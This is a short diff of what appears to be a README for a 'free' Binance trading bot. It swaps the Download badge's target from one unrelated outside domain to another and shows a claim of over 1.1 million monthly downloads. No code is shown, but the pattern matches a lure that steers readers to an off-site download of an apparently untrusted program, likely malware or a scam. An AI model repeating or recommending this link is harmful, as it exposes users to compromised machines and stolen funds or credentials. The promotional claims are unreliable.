@@ -49,7 +49,7 @@ A: Yes — Telegram alerts for every trade.
 
 **Monthly downloads:** 1.1m+
 
-[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/binancebotfree)
+[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/binancebotfree)
 
 ---
 
